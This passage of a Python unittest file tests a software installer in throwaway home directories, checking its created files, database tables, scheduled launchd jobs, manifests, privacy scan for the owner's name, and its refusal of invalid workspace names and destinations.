#!/usr/bin/env python3
"""Installer acceptance: fresh HOME for every test, no live runtime or network."""
import csv
import hashlib
import json
import os
from pathlib import Path
import plistlib
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

HERE = Path(__file__).resolve().parent
TREE = HERE.parent
RUN = TREE.parent.parent
PYTHON = '/usr/bin/python3'
PYTHON_EXEC = subprocess.check_output([PYTHON, '-c', 'import sys; print(sys.executable)'], text=True).strip()
sys.path.insert(0, str(TREE))
# The installer is source-only: a live home has no install.py (T671 base study, recheck 2 T742).
if not (TREE / 'install.py').exists():
    raise unittest.SkipTest('install.py ships in the source tree only')
import install

from base.tests.privacy_support import account_name
import pwd
OWNER = re.compile('|'.join(re.escape(value) for value in (account_name(), pwd.getpwuid(os.getuid()).pw_name)), re.I)


class Installer(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='accept-')
        self.root = Path(self.temp.name).resolve()
        self.addCleanup(self.temp.cleanup)
        self.user = self.root / 'user'
        self.user.mkdir()
        self.home = self.root / 'system'
        self.portfolio = self.root / 'portfolio'
        self.env = {key: value for key, value in os.environ.items()
                    if not key.startswith('FOXRUN_') and key not in ('PYTHONPATH','PYTHONHOME')}
        self.env.update(HOME=str(self.user), PYTHONDONTWRITEBYTECODE='1')
        # Never the real launchd: every install in these tests loads its nightly job through this stub.
        self.launchctl_log = self.root / 'launchctl.log'
        stub = self.root / 'launchctl'
        stub.write_text('#!/bin/sh\necho "$@" >> ' + shlex.quote(str(self.launchctl_log)) + '\n')
        stub.chmod(0o755)
        self.env['FOXRUN_LAUNCHCTL'] = str(stub)

    def command(self, *extra, input=None, home=None, portfolio=None):
        self.assertEqual(list(self.user.iterdir()), [], 'HOME must start empty')
        return subprocess.run([PYTHON,'-B',str(TREE / 'install.py'),
                               '--home',str(home if home is not None else self.home),
                               '--portfolio',str(portfolio if portfolio is not None else self.portfolio),
                               *extra], cwd=str(TREE),env=self.env,input=input,text=True,capture_output=True)

    def run_tool(self, path, *args, env=None):
        return subprocess.run([PYTHON,'-B',str(path),*args],cwd=str(self.root),
                              env=env or self.env,text=True,capture_output=True)

    def seat_boot_files(self, prefix):
        skills = ('chief', 'architect', 'keeper', 'toolsmith', 'skillwright', 'scout', 'adviser')
        expected = set()
        for skill in skills:
            expected.add(prefix + '/' + skill + '/SKILL.md')
            replay = 'read-seat-boot' if skill in ('chief', 'architect') else 'read-purpose'
            expected.add(prefix + '/' + skill + '/replays/' + replay + '.json')
        for name in install.product_skills(TREE):
            source = TREE / 'skillwright/skills' / name
            expected.update(prefix + '/' + name + '/' + p.relative_to(source).as_posix()
                            for p in source.rglob('*') if p.is_file() and '__pycache__' not in p.parts)
        return expected

    def assert_install(self, result, person='person', workspace='my-workspace'):
        self.assertEqual(result.returncode,0,result.stdout + result.stderr)
        self.assertIn('Install time:', result.stdout)
        self.assertIn('Next command: python3 ' + str(self.home / 'foxrun.py') + ' start',result.stdout)
        self.assertIn('fresh template',result.stdout)
        config = json.loads((self.home / 'config/person.json').read_text())
        self.assertEqual(config['name'],person)
        contract = (self.home / 'profile/AGENTS.md').read_text()
        self.assertIn('A direct word from ' + person.capitalize() + ' wins', contract)
        self.assertIn(str(self.home / 'foxrun.py') + ' start --workspace <ws>', contract)
        self.assertIn(str(self.portfolio / 'atlas/LIBRARY.md'), contract)
        self.assertNotRegex(contract, r'@Person@|<home>|<portfolio>')
        self.assertEqual(config['default_workspace'],workspace)
        self.assertEqual(config['leads'],[('lead-' + workspace)[:40]])
        # Check the frozen source list independently from the installer's embedded copy.
        target = [dict(row, how="made-at-install") for row in install.made_rows()]
        made = [row for row in target if row['how']=='made-at-install']
        self.assertEqual(len(made),len(install.made_rows()))
        missing = []
        with sqlite3.connect(str(self.home / 'data.db')) as db:
            self.assertEqual(db.execute('SELECT 1').fetchone(),(1,))
            tables = {row[0] for row in db.execute("SELECT name FROM sqlite_master WHERE type='table'")}
            self.assertTrue({'tasks','captures','work_tasks','base_fields','base_capabilities'} <= tables)
            # g-people-ships-with-small-talk: a core install has no people tables, old or new model.
            self.assertFalse(tables & {'persons','handles','interactions','organizations'})
            self.assertFalse(any(name.startswith('people_') for name in tables))
            self.assertNotIn('content', tables)
            self.assertFalse(any(name.startswith('design_') for name in tables))
            self.assertFalse(any(name.startswith(('amazon_','commerce_','ugc_','treasury_')) for name in tables))
            self.assertEqual({row[0] for row in db.execute('SELECT name FROM base_modules')},
                             {'base','work'})
            self.assertEqual({row[0] for row in db.execute('SELECT module FROM installed_modules')},
                             {'base','work','capture'})
            for row in made:
                if row['kind']=='table':
                    if Path(row['path']).name not in tables:
                        missing.append(row['path'])
                elif row['kind']=='table-group':
                    # Groups are model labels, never folders beneath the SQLite file.
                    self.assertIn(Path(row['path'].rstrip('/')).name,install.shipped_packs(self.home))
                else:
                    base = self.home if row['home']=='system' else self.portfolio
                    path = base / row['path'].replace('<workspace>',workspace).rstrip('/')
                    self.assertTrue(path.exists(),str(path))
                    self.assertEqual(path.is_dir(),row['kind']=='folder',str(path))
        self.assertEqual(missing,install.missing_tables(self.home))
        self.assertEqual(missing, [])
        # Every directory implied by the shipped manifests exists, including empty template folders.
        for manifest in self.home.glob('*/install.json'):
            if manifest.parent.name=='capture':
                continue
            for row in json.loads(manifest.read_text())['files']:
                self.assertTrue((self.portfolio / workspace / row['to']).exists(),row['to'])
        ident = ('lead-' + workspace)[:40]
        for runtime, ext in [('claude','md'),('codex','toml')]:
            self.assertTrue((self.home / 'agents/generated' / runtime / (ident+'.'+ext)).is_file())
            self.assertTrue((self.portfolio / workspace / 'team' / runtime / (ident+'.'+ext)).is_file())
            for cape in (self.home / 'agents/generated' / runtime).iterdir():
                self.assertNotRegex(cape.read_text(), r'(?m)^model\s*[:=]')
            self.assertNotRegex((self.portfolio / workspace / 'team' / runtime / (ident+'.'+ext)).read_text(),
                                r'(?m)^model\s*[:=]')
        self.assertFalse((self.home / 'agents/generated/hermes').exists())
        self.assertFalse(any(p.name=='not-shipped' for p in self.home.rglob('*')))
        for name in install.BUILD_ONLY - {'made-at-install.tsv'}:
            self.assertTrue((TREE / name).is_file(), name)
            self.assertFalse((self.home / name).exists(), name)
        self.assertEqual((self.home / 'made-at-install.tsv').read_bytes(),
                         (self.home / 'base/made-at-install.tsv').read_bytes())
        with (self.home / 'base/product-manifest.tsv').open(newline='') as stream:
            installed = {row['path'] for row in csv.DictReader(stream, delimiter='\t')}
        self.assertFalse(install.BUILD_ONLY & installed)
        doctor = self.run_tool(self.home/'foxrun.py','doctor')
        self.assertEqual(doctor.returncode,0,doctor.stdout+doctor.stderr)
        # The exact next command also works with no FOXRUN environment.
        start = self.run_tool(self.home/'foxrun.py','start')
        self.assertEqual(start.returncode,0,start.stdout+start.stderr)
        self.assertIn(person,start.stdout)
        self.assertIn(workspace,start.stdout)
        # Standalone base.paths resolves the two installed folders from config.
        env = dict(self.env, FOXRUN_HOME=str(self.home))
        probe = subprocess.run([PYTHON,'-B','-c',
            'from base import paths; print(paths.portfolio())'],cwd=str(self.home),
            env=env,text=True,capture_output=True)
        self.assertEqual(probe.stdout.strip(),str(self.portfolio))
        # Create and retrieve the task using work.py's existing show command.
        env = dict(self.env,FOXRUN_HOME=str(self.home),FOXRUN_PORTFOLIO=str(self.portfolio))
        command = [PYTHON,'-B',str(self.home/'work/work.py'),'--db',str(self.home/'data.db'),
                   '--receipt-root',str(self.home)]
        # Every new task carries the six fields (T718); Where names a file in the system home.
        six = ['--problem','The install needs a first task','--job-when','When the install ends',
               '--job-want','I want to write one task','--job-so','So I can see the writer work',
               '--body','Writes one task row','--acceptance','show returns the task',
               '--context','Install acceptance','--where','AGENTS.md']
        create = subprocess.run(command+['create','--title','Acceptance task','--by',person,*six],
                                env=env,text=True,capture_output=True)
        self.assertEqual(create.returncode,0,create.stderr)
        show = subprocess.run(command+['show',create.stdout.strip()],env=env,text=True,capture_output=True)
        self.assertEqual(show.returncode,0,show.stderr)
        # show prints the task, then one ' link:' line for each Where link.
        self.assertEqual(json.JSONDecoder().raw_decode(show.stdout)[0]['title'],'Acceptance task')
        self.assertIn("'relation': 'where'", show.stdout)
        # Install records the product folder it ran from; a later update without --source uses it.
        record = self.home / 'config/product-source.json'
        script = next(Path(arg) for arg in result.args if str(arg).endswith('install.py'))
        self.assertEqual(json.loads(record.read_text()),{'version':1,'source':str(script.resolve().parent)})
        hits = []
        for base in (self.home,self.portfolio):
            for path in base.rglob('*'):
                if not path.is_file():
                    continue
                # SQLite bytes contain names too. No file is exempt from the owner scan.
                text = path.read_bytes().decode('utf-8',errors='ignore')
                text = text.replace(str(self.home), '<system-home>').replace(str(self.portfolio), '<portfolio-home>').replace(str(self.user), '<user-home>')
                # The source record names the product folder install ran from, a machine path like the three above.
                if path == record:
                    text = text.replace(str(script.resolve().parent), '<source-tree>')
                if OWNER.search(text):
                    hits.append(str(path.relative_to(base)))
        self.assertEqual(hits,[])
        # Runtime contracts install without hookup; hooks stay in the selected runtime home.
        expected = {'Library/LaunchAgents/com.foxrun.session-nightly.plist',
                    'Library/LaunchAgents/com.foxrun.session-nightly-watchdog.plist'}
        if '--runtime-home' not in result.args:
            for runtime in ('claude', 'codex') if config['runtime'] == 'both' else (config['runtime'],):
                expected.add('.' + runtime + ('/CLAUDE.md' if runtime == 'claude' else '/AGENTS.md'))
        if '--runtime-home' not in result.args:
            # A trial install keeps the shared shelf under its runtime home (B-20261024-install-writes-real-agents-skills-in-trial).
            expected.update(self.seat_boot_files('.agents/skills'))
            for runtime in ('claude', 'codex') if config['runtime'] == 'both' else (config['runtime'],):
                expected.update(self.seat_boot_files('.' + runtime + '/skills'))
        self.assertEqual({p.relative_to(self.user).as_posix() for p in self.user.rglob('*') if p.is_file()}, expected)
        self.assertTrue((self.user / '.local/state/foxrun/session-nightly').is_dir())

    def test_yes_defaults(self):
        result = self.command('--yes')
        self.assert_install(result)
        pass
        pass
        with sqlite3.connect(str(self.home/'data.db')) as db:
            tables=[row[0] for row in db.execute("SELECT name FROM sqlite_master WHERE type='table'")]
        (self.root / 'acceptance-counts.json').write_text(json.dumps({
            'made_rows':len(install.made_rows()),'missing_table_rows':18,'database_tables':len(tables),
            'owner_hits':0,'install_seconds':float(re.search(r'Install time: ([0-9.]+)',result.stdout).group(1)),
            'made_filesystem_rows':sum(r['kind'] not in ('table','table-group') for r in install.made_rows())},indent=2)+'\n')

    def test_install_turns_on_the_nightly_job(self):
        result = self.command('--yes')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        for name in ('cron/nightly.py', 'memory/dream.py', 'memory/check.py', 'cron/schedule.py'):
            self.assertTrue((self.home / name).is_file(), name)
        job_file = self.user / 'Library/LaunchAgents/com.foxrun.session-nightly.plist'
        self.assertIn('Nightly job: written ' + str(job_file), result.stdout)
        job = plistlib.loads(job_file.read_bytes())
        self.assertEqual(job['Label'], 'com.foxrun.session-nightly')
        self.assertEqual(job['ProgramArguments'][1:], ['-B', str(self.home / 'cron/nightly.py')])
        self.assertEqual(job['EnvironmentVariables']['FOXRUN_HOME'], str(self.home))
        self.assertEqual(job['EnvironmentVariables']['FOXRUN_PORTFOLIO'], str(self.portfolio))
        self.assertEqual(job['EnvironmentVariables']['HOME'], str(self.user))
        self.assertEqual(job['StartCalendarInterval'], {'Hour': 2, 'Minute': 30})
        self.assertNotRegex(job_file.read_text(), r'@[A-Z_]+@')
        self.assertIsNone(OWNER.search(job_file.read_text().replace(str(self.root), '<root>')))
        watchdog_file = self.user / 'Library/LaunchAgents/com.foxrun.session-nightly-watchdog.plist'
        watchdog = plistlib.loads(watchdog_file.read_bytes())
        self.assertEqual(watchdog, {
            'Label': 'com.foxrun.session-nightly-watchdog',
            'ProgramArguments': [PYTHON_EXEC, '-B', str(self.home / 'cron/watchdog.py'), '--home', str(self.home)],
            'EnvironmentVariables': {'HOME': str(self.user), 'PYTHONDONTWRITEBYTECODE': '1',
                                     'FOXRUN_HOME': str(self.home)},
            'StartInterval': 300,
            'RunAtLoad': True,
            'StandardOutPath': str(self.user / '.local/state/foxrun/session-nightly/watchdog-stdout.log'),
            'StandardErrorPath': str(self.user / '.local/state/foxrun/session-nightly/watchdog-stderr.log'),
            'WorkingDirectory': str(self.home),
        })
        self.assertEqual(self.launchctl_log.read_text().splitlines(),
                         ['bootstrap gui/%d %s' % (os.getuid(), job_file),
                          'bootstrap gui/%d %s' % (os.getuid(), watchdog_file)])
        self.assertTrue(json.loads((self.home / 'health.json').read_text())['schedules_enabled'])
        # The person's job file, rendered again: equal, so nothing is written or loaded.
        probe = self.run_tool(self.home / 'cron/schedule.py', '--home', str(self.home), '--portfolio', str(self.portfolio),
                              '--python', job['ProgramArguments'][0], '--compare', str(job_file))
        self.assertEqual(probe.returncode, 0, probe.stdout + probe.stderr)
        again = self.run_tool(self.home / 'cron/schedule.py', '--home', str(self.home), '--portfolio', str(self.portfolio),
                              '--python', job['ProgramArguments'][0], '--on')
        self.assertIn('Nightly job: unchanged', again.stdout, again.stderr)
        self.assertEqual(len(self.launchctl_log.read_text().splitlines()), 2)
        # The preview, with no FOXRUN variables, finds this install's portfolio and prints the same job.
        preview = subprocess.run([PYTHON, '-B', str(self.home / 'cron/nightly.py'), '--schedule'],
                                 cwd=str(self.root), env=self.env, capture_output=True)
        self.assertEqual(preview.returncode, 0, preview.stderr)
        self.assertEqual(plistlib.loads(preview.stdout), job)

    def test_no_schedule_leaves_only_runtime_contracts(self):
        result = self.command('--yes', '--no-schedule')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('Nightly job: off (--no-schedule)', result.stdout)
        self.assertTrue((self.home / 'cron/nightly.py').is_file())
        expected = {'.claude/CLAUDE.md', '.codex/AGENTS.md'}
        for prefix in ('.agents/skills', '.claude/skills', '.codex/skills'):
            expected.update(self.seat_boot_files(prefix))
        self.assertEqual({p.relative_to(self.user).as_posix() for p in self.user.rglob('*') if p.is_file()}, expected)
        self.assertFalse(self.launchctl_log.exists())
        self.assertFalse(json.loads((self.home / 'health.json').read_text())['schedules_enabled'])

    def test_build_only_paths_in_transport_manifest_are_not_installed(self):
        # A stale transport list must not bypass either install-time exclusion.
        core = self.root / 'core'
        shutil.copytree(TREE, core, ignore=shutil.ignore_patterns('__pycache__'))
        manifest = core / 'product-manifest.tsv'
        with manifest.open(newline='') as stream:
            rows = list(csv.DictReader(stream, delimiter='\t'))
        names = {row['path'] for row in rows}
        for name in sorted(install.BUILD_ONLY - names):
            raw = (core / name).read_bytes()
            rows.append({'path': name, 'bytes': len(raw), 'sha256': hashlib.sha256(raw).hexdigest()})
        with manifest.open('w', newline='') as stream:
            writer = csv.DictWriter(stream, fieldnames=('path', 'bytes', 'sha256'), delimiter='\t')
            writer.writeheader()
            writer.writerows(rows)
        result = subprocess.run([PYTHON, '-B', str(core / 'install.py'), '--yes',
                                 '--home', str(self.home), '--portfolio', str(self.portfolio)],
                                env=self.env, text=True, capture_output=True)
        self.assert_install(result)

    def test_design_is_an_optional_pack(self):
        # T669: the design framework is a separate add-on; the product tree has no design pack.
        self.assertFalse((TREE / 'design').exists())
        self.assertNotIn('design', install.shipped_packs(TREE))

    def test_clean_core_without_design_installs(self):
        core = self.root / 'core'
        shutil.copytree(TREE, core, ignore=lambda folder, names:
                        {'design', '__pycache__'} if Path(folder) == TREE else {'__pycache__'})
        manifest = core / 'product-manifest.tsv'
        with manifest.open(newline='') as stream:
            rows = [r for r in csv.DictReader(stream, delimiter='\t')
                    if not r['path'].startswith('design/')]
        with manifest.open('w', newline='') as stream:
            writer = csv.DictWriter(stream, fieldnames=('path', 'bytes', 'sha256'), delimiter='\t')
            writer.writeheader()
            writer.writerows(rows)
        result = subprocess.run([PYTHON, '-B', str(core / 'install.py'), '--yes',
                                '--home', str(self.home), '--portfolio', str(self.portfolio)],
                                env=self.env, text=True, capture_output=True)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertFalse((self.home / 'design').exists())
        with sqlite3.connect(str(self.home / 'data.db')) as db:
            self.assertNotIn(('design',), db.execute('SELECT module FROM installed_modules').fetchall())

    def test_addon_instructions_use_python_launcher(self):
        for name in ('GUIDE.md', 'INSTALL.md'):
            text = (TREE / name).read_text()
            self.assertNotRegex(text, r'`foxrun\s+[a-z]+')
            self.assertIn('python3 "$HOME/.foxrun/foxrun.py" addons', text.replace('""', '"'))

    def test_install_guide_lists_every_capture_program(self):
        # T677: each reader's outside program reaches the install guide from install.json.
        guide = (TREE / 'INSTALL.md').read_text()
        needs = json.loads((TREE / 'capture/install.json').read_text())['needs']
        self.assertTrue(needs)
        for need in needs:
            self.assertIn('| `%s` | The `%s` reader in capture.' % (need['program'], need['reader']), guide)
            self.assertIn('`%s`' % need['get'], guide)

    def test_install_creates_no_inbox_folder(self):
        result = self.command('--yes')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertFalse((self.portfolio / 'inbox').exists())
        self.assertFalse(any(p.name == 'inbox' for p in self.portfolio.rglob('*') if p.is_dir()))

    def test_global_contract_fresh_profile_uses_install_inputs(self):
        install.install_profile(TREE, self.home, self.portfolio, 'avery')
        target = self.home / 'profile/AGENTS.md'
        contract = target.read_text()
        self.assertTrue(contract.startswith('---\ntype: agents\n'))
        self.assertEqual((self.home / 'config/templates/profile/AGENTS.md').read_bytes(),
                         (TREE / 'config/templates/profile/AGENTS.md').read_bytes())
        self.assertIn('A direct word from Avery wins', contract)
        self.assertIn(str(self.home / 'foxrun.py') + ' start --workspace <ws>', contract)
        self.assertIn(str(self.portfolio / 'atlas/LIBRARY.md'), contract)
        self.assertNotRegex(contract, r'@Person@|<home>|<portfolio>')
        self.assertIsNone(OWNER.search(contract.replace(str(self.root), '<root>')))

    def test_global_contract_existing_profile_survives_install_and_update(self):
        install.copy_tree(TREE, self.home)
        target = self.home / 'profile/AGENTS.md'
        target.parent.mkdir(parents=True, exist_ok=True)
        edited = b"# Global Contract\n\nThe person wrote this.\n"
        target.write_bytes(edited)
        # Existing contracts do not need an available starter to remain intact.
        install.install_profile(self.root / 'missing-source', self.home, self.portfolio, 'avery')
        self.assertEqual(target.read_bytes(), edited)
        install.copy_tree(TREE, self.home)
        install.install_profile(TREE, self.home, self.portfolio, 'avery')
        self.assertEqual(target.read_bytes(), edited)

    def test_soul_installs_once_and_the_person_owns_it(self):
        # g-the-soul-ships-as-a-starter-the-person-owns-it-after-install
        self.assert_install(self.command('--yes'))
        soul = self.home / 'agents/soul.md'
        self.assertEqual(soul.read_bytes(), (TREE / 'agents/soul.md').read_bytes())
        with (self.home / 'base/product-manifest.tsv').open(newline='') as stream:
            self.assertNotIn('agents/soul.md', {row['path'] for row in csv.DictReader(stream, delimiter='\t')})
        with (self.home / 'base/made-at-install.tsv').open(newline='') as stream:
            self.assertIn(('agents/soul.md', 'file'),
                          {(row['path'], row['kind']) for row in csv.DictReader(stream, delimiter='\t')})
        # The person edits the soul; the doctor does not report it.
        edited = b'# Soul\n\nThe person wrote this.\n'
        soul.write_bytes(edited)
        doctor = self.run_tool(self.home / 'foxrun.py', 'doctor')
        self.assertEqual(doctor.returncode, 0, doctor.stdout + doctor.stderr)
        self.assertNotIn('FAIL shipped agents/soul.md', doctor.stdout)
        self.assertIn('PASS made agents/soul.md', doctor.stdout)
        # An update lays the product over the home again; the soul stays byte-for-byte.
        install.copy_tree(TREE, self.home)
        self.assertEqual(soul.read_bytes(), edited)

    def test_person_lists_install_once_and_an_update_keeps_them(self):
        # T742: business names, workspaces, and words are the person's rows after install.
        self.assert_install(self.command('--yes'))
        names = ('config/lint/business-names.tsv', 'config/lint/workspaces.tsv', 'config/words.tsv',
                 'config/gates.local.md', 'config/git.local.md')
        generic = ('config/gates.md', 'config/git.md')  # approvals 422, 432: they ship; an update refreshes them
        for name in ('config/words.tsv', 'config/gates.local.md', 'config/git.local.md') + generic:
            self.assertEqual((self.home / name).read_bytes(), (TREE / name).read_bytes(), name)
        with (self.home / 'base/product-manifest.tsv').open(newline='') as stream:
            shipped = {row['path'] for row in csv.DictReader(stream, delimiter='\t')}
        with (self.home / 'base/made-at-install.tsv').open(newline='') as stream:
            made = {(row['path'], row['kind']) for row in csv.DictReader(stream, delimiter='\t')}
        for name in generic:
            self.assertIn(name, shipped)
            self.assertNotIn((name, 'file'), made)
            (self.home / name).write_bytes(b'stale\n')
        for name in names:
            self.assertNotIn(name, shipped)
            self.assertIn((name, 'file'), made)
            path = self.home / name
            path.write_bytes(path.read_bytes() + b'person\trow\n')
        edited = {name: (self.home / name).read_bytes() for name in names}
        install.copy_tree(TREE, self.home)
        for name in names:
            self.assertEqual((self.home / name).read_bytes(), edited[name], name)
        for name in generic:
            self.assertEqual((self.home / name).read_bytes(), (TREE / name).read_bytes(), name)

    def test_release_record_installs_once_and_an_update_keeps_it(self):
        # T675: skill-ship writes skillwright/manifests/shipped.yaml after install; a product copy never replaces it.
        self.assert_install(self.command('--yes'))
        name = 'skillwright/manifests/shipped.yaml'
        record = self.home / name
        self.assertEqual(record.read_bytes(), (TREE / name).read_bytes())
        with (self.home / 'base/product-manifest.tsv').open(newline='') as stream:
            self.assertNotIn(name, {row['path'] for row in csv.DictReader(stream, delimiter='\t')})
        with (self.home / 'base/made-at-install.tsv').open(newline='') as stream:
            self.assertIn((name, 'file'), {(row['path'], row['kind']) for row in csv.DictReader(stream, delimiter='\t')})
        shipped = b'{\n  "release_id": "R1",\n  "skills": {}\n}\n'
        record.write_bytes(shipped)
        install.copy_tree(TREE, self.home)
        self.assertEqual(record.read_bytes(), shipped)

    def test_atlas_installs_as_a_standard_workspace(self):
        # g-atlas-is-a-standard-workspace-with-its-wiki-at-the-top: standard pages and history, wiki flat at the top.
        result = self.command('--yes')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        atlas = self.portfolio / 'atlas'
        for name in ('AGENTS.md', 'CLAUDE.md', 'index.md', 'STATE.md', 'RESOLVER.md', 'LIBRARY.md', 'TOPICS.md', 'SCHEMA.md'):
            self.assertTrue((atlas / name).is_file(), name)
        self.assertTrue((atlas / 'history/LOG.md').is_file())
        for folder in ('daily', 'handoffs', 'outputs', 'runs'):
            self.assertTrue((atlas / 'history' / folder / '.gitkeep').is_file(), folder)
        for folder in ('concepts', 'entities', 'comparisons', 'queries', 'raw'):
            self.assertTrue((atlas / folder).is_dir(), folder)
        self.assertFalse((atlas / 'wiki').exists())
        # T689: the builders make STATE.md and index.md; these pages are no stubs.
        for name in ('STATE.md', 'GLOSSARY.md', 'CLAUDE.md'):
            self.assertNotIn('No records yet.', (atlas / name).read_text(), name)
        self.assertTrue((atlas / 'index.md').read_text().startswith('---\ntype: index\nworkspace: atlas\n'))
        self.assertIn('# State: atlas\n', (atlas / 'STATE.md').read_text())
        self.assertIn('# Index: atlas\n', (atlas / 'index.md').read_text())
        self.assertIn('# Glossary: atlas\n', (atlas / 'GLOSSARY.md').read_text())
        self.assertTrue((atlas / 'config/glossary-tags.json').is_file())
        # The standard CLAUDE shim: front matter, then the first line every shim has.
        shim = (atlas / 'CLAUDE.md').read_text()
        self.assertTrue(shim.startswith('---\ntype: agents\nworkspace: atlas\ntimestamp: '))
        self.assertIn('\n---\n@AGENTS.md\n', shim)
        # The system page and the first workspace are built too, never stubs.
        self.assertIn('# State: system\n', (self.home / 'STATE.md').read_text())
        self.assertIn('# State: my-workspace\n', (self.portfolio / 'my-workspace/STATE.md').read_text())
        # T697: every index.md, the portfolio's too, has the shape of base/templates/index.md and is fresh.
        day = (self.portfolio / 'index.md').read_text().split('timestamp: ', 1)[1][:10]
        shape = self.run_tool(self.home / 'base/page_indexes.py', '--portfolio', str(self.portfolio),
                              '--system-home', str(self.home), '--as-of', day, '--kind', 'index', '--check')
        self.assertEqual(shape.returncode, 0, shape.stdout + shape.stderr)
        self.assertIn('# Index: portfolio\n', (self.portfolio / 'index.md').read_text())
        check = self.run_tool(self.home / 'memory/state.py', 'build', '--all', '--check',
                              env=dict(self.env, FOXRUN_HOME=str(self.home), FOXRUN_PORTFOLIO=str(self.portfolio)))
        self.assertEqual(check.returncode, 0, check.stdout + check.stderr)

    def test_installed_contract_uses_only_installed_links(self):
        result = self.command('--yes')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        contract = self.home / 'AGENTS.md'
        self.assertEqual(contract.read_bytes(), (TREE / 'AGENTS.md').read_bytes())
        text = contract.read_text()
        self.assertIn('[`RESOLVER.md`](RESOLVER.md)', text)
        self.assertIn('[global contract](profile/AGENTS.md)', text)
        self.assertNotIn('~/.foxrun', text)
        for target in re.findall(r'\]\(([^)#]+)\)', text):
            self.assertTrue((contract.parent / target).is_file(), target)

    def test_shipped_pages_link_only_installed_files(self):
        # Shipped pages linked files that never install: gh.md, capture and orchestrate skills, history runs.
        result = self.command('--yes')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        with (TREE / 'product-manifest.tsv').open(newline='') as stream:
            pages = [row['path'] for row in csv.DictReader(stream, delimiter='\t')
                     if row['path'].endswith('.md') and row['path'] not in install.BUILD_ONLY]
        # A template's links resolve where it is rendered; a fixture is test input, not a page.
        pages = [page for page in pages if '/templates/' not in '/' + page and '/fixtures/' not in page]
        for page in ('OPTIONAL-ADDONS.md', 'GUIDE.md', 'tools/cli/gh.md', 'tools/cli/herdr.md',
                     'memory/README-search.md', 'hooks/README.md', 'work/README-history-proof.md'):
            self.assertIn(page, pages)
        broken = []
        for page in pages:
            path = self.home / page
            self.assertTrue(path.is_file(), page)
            text = re.sub(r'```.*?```', '', path.read_text(), flags=re.S)
            text = re.sub(r'`[^`\n]*`', '', text)
            for target in re.findall(r'\]\(([^)\s#]+)[^)]*\)', text):
                if re.match(r'[a-z][a-z0-9+.-]*:|[/~<]', target, re.I):
                    continue
                if not (path.parent / target).exists():
                    broken.append(page + ' -> ' + target)
        self.assertEqual(broken, [])

    def test_manifest_rows_match_committed_files(self):
        # hooks/README.md kept a 431-byte row for a 4387-byte file, and the installer never checks rows:
        # copy_tree reads only the paths, and write_manifests hashes the installed copy.
        # Both the manifest and each file come from HEAD, so another session's unstaged edits do not fail this.
        top = subprocess.run(['git', '-C', str(TREE), 'rev-parse', '--show-prefix'], capture_output=True, text=True)
        if top.returncode:
            self.skipTest('no git checkout at ' + str(TREE))
        prefix = top.stdout.strip()

        def blobs(paths):
            batch = subprocess.run(['git', '-C', str(TREE), 'cat-file', '--batch'], capture_output=True, check=True,
                                   input=''.join('HEAD:' + prefix + path + '\n' for path in paths).encode())
            out, at, found = batch.stdout, 0, {}
            for path in paths:
                end = out.index(b'\n', at)
                header = out[at:end].split()
                at = end + 1
                if header[-1] == b'missing':
                    found[path] = None
                    continue
                size = int(header[2])
                found[path] = out[at:at + size]
                at += size + 1
            return found

        manifest = blobs(['product-manifest.tsv'])['product-manifest.tsv']
        self.assertIsNotNone(manifest, 'product-manifest.tsv is not committed')
        rows = list(csv.DictReader(manifest.decode('utf-8').splitlines(), delimiter='\t'))
        self.assertGreater(len(rows), 0)
        files = blobs([row['path'] for row in rows])
        wrong = []
        for row in rows:
            raw = files[row['path']]
            if raw is None:
                wrong.append(row['path'] + ': not committed')
            elif (int(row['bytes']), row['sha256']) != (len(raw), hashlib.sha256(raw).hexdigest()):
                wrong.append('%s: row %s bytes, file %d bytes' % (row['path'], row['bytes'], len(raw)))
        self.assertEqual(wrong, [])

    def test_yes_avery_cedar_shop(self):
        result = self.command('--yes','--person','avery','--workspace','cedar-shop','--runtime','claude')
        self.assert_install(result,'avery','cedar-shop')
        self.assertNotIn('hooks.json',result.stdout)

    def test_interactive_three_questions(self):
        result = self.command(input='avery\ncedar-shop\ncodex\n')
        self.assert_install(result,'avery','cedar-shop')
        self.assertEqual(result.stdout.count(']: '),3)
        self.assertNotIn('settings.json',result.stdout)

    def test_interactive_defaults(self):
        self.assert_install(self.command(input='\n\n\n'))

    def test_lowercase_digit_workspace(self):
        self.assert_install(self.command('--yes','--workspace','7'),'person','7')

    def test_invalid_workspace_refused_before_writes(self):
        for name in ('../escape','Bad Name','UPPER','name_underscore','atlas','inbox'):
            with self.subTest(name=name):
                result = self.command('--yes','--workspace',name)
                self.assertNotEqual(result.returncode,0)
                self.assertFalse(self.home.exists())
                self.assertFalse(self.portfolio.exists())

    def test_invalid_person_refused_before_writes(self):
        result=self.command('--yes','--person','a name')
        self.assertNotEqual(result.returncode,0)
        self.assertFalse(self.home.exists())

    def refusal(self, kind, which):
        path = self.home if which=='home' else self.portfolio
        if kind=='nonempty':
            path.mkdir(); (path/'keep.txt').write_text('keep')
        elif kind=='relative':
            path = Path('relative-install')
        elif kind=='symlink':
            actual = self.root/'real';actual.mkdir();path.symlink_to(actual,target_is_directory=True)
        elif kind=='inside':
            path = TREE/'inside-install'
        args = {which:path}
        result = self.command('--yes',**args)
        self.assertNotEqual(result.returncode,0,result.stdout)
        self.assertIn({'nonempty':'not empty','relative':'absolute','symlink':'symlink','inside':'product tree'}[kind],result.stderr)
        other = self.portfolio if which=='home' else self.home
        self.assertFalse(other.exists())
        if kind=='nonempty':
            self.assertEqual((path/'keep.txt').read_text(),'keep')
        if kind=='symlink':
            self.assertEqual(list(actual.iterdir()),[])

    def test_bad_home_nonempty(self): self.refusal('nonempty','home')
    def test_bad_home_relative(self): self.refusal('relative','home')
    def test_bad_home_symlink(self): self.refusal('symlink','home')
    def test_bad_home_inside_tree(self): self.refusal('inside','home')
    def test_bad_portfolio_nonempty(self): self.refusal('nonempty','portfolio')
    def test_bad_portfolio_relative(self): self.refusal('relative','portfolio')
    def test_bad_portfolio_symlink(self): self.refusal('symlink','portfolio')
    def test_bad_portfolio_inside_tree(self): self.refusal('inside','portfolio')

    def test_empty_existing_destinations(self):
